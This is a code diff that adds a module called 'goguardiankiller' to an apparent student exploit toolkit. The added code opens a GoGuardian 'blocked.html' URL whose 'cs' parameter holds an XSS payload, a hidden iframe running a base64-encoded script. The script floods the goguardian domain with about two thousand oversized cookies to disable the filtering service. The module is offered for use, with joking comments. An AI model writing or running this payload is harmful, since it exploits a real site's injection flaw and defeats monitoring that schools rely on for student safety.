@@ -1357,6 +1357,28 @@
                 }
                 n.default = t
             },
+            2441: (e, n) => {
+                'use strict'
+                Object.defineProperty(n, '__esModule', { value: !0 })
+                const t = {
+                    display_name: 'goguardiankiller but prob broken lol',
+                    description: 'Kills goguardian. It will say error, you must reload the page after.',
+                    id: 'goguardiankiller',
+                    section: 'exploit',
+                    onactive: function () {
+                        var url = "https://student.goguardian.com/teacher/blocked.html?cs=[{\"name\":\"\"}, {\"name\":\"<style>*{display:none}<\\/style><iframe srcdoc=\\\"<script>top.eval(atob(`bGV0IGNvb2tpZXMgPSBbXTsKCmZvciAobGV0IGkgPSAwOyBpIDwgMmUzOyBpKyspIHsKICBjb29raWVzLnB1c2goewogICAgbmFtZTogYGNkJHtpfWAsCiAgICB2YWx1ZTogZW5jb2RlVVJJQ29tcG9uZW50KGJ0b2EoY3J5cHRvLmdldFJhbmRvbVZhbHVlcyhuZXcgVWludDhBcnJheSgyNSAqIDI1KSkpKSwKICAgIGV4cGlyZXM6IG5ldyBEYXRlKDJlMTQpLnRvVVRDU3RyaW5nKCksCiAgICBwYXRoOiAiLyIsCiAgICBkb21haW46IGxvY2F0aW9uLmhvc3Quc3BsaXQoIi4iKS5zbGljZSgtMikuam9pbigiLiIpCiAgfSk7Cn0KCmNvb2tpZXMgPSBjb29raWVzLm1hcChjb29raWUgPT4gYCR7Y29va2llLm5hbWV9PSR7Y29va2llLnZhbHVlfTtleHBpcmVzPSR7Y29va2llLmV4cGlyZXN9O3BhdGg9JHtjb29raWUucGF0aH07ZG9tYWluPSR7Y29va2llLmRvbWFpbn07YCk7Cgpjb29raWVzLmZvckVhY2goKGNvb2tpZSkgPT4gKGRvY3VtZW50LmNvb2tpZSA9IGNvb2tpZSkpO2hpc3RvcnkucmVwbGFjZVN0YXRlKHt9LHt9LCcvJyk==`))<\\/script>\\\"></iframe>\"}]";
+
+                        // idfk if this will work :skull emoji:
+                        window.open(url, '_blank');
+
+                    },
+                    ondisable: function () {
+                        alert("go to goguardian.com and clear all cookies+cache, disabling this does nothing");
+                    },
+                    custom_render: !1,
+                }
+                n.default = t
+            },
             7737: (e, n) => {
                 'use strict'
                 Object.defineProperty(n, '__esModule', { value: !0 })
@@ -2209,6 +2231,8 @@
                     './exploits/autohide.ts': 1947,
                     './exploits/betterforceselect.ts': 7802,
                     './exploits/noforcereload.ts': 2440,
+                    // what the fuck do the numbers mean mason!?/11??!?!
+                    './exploits/goguardiankiller.ts': 2441,
                     './fun/editpagetext.ts': 7737,
                     './fun/historyflooder.ts': 1411,
                     './fun/metalpipe.ts': 8419,
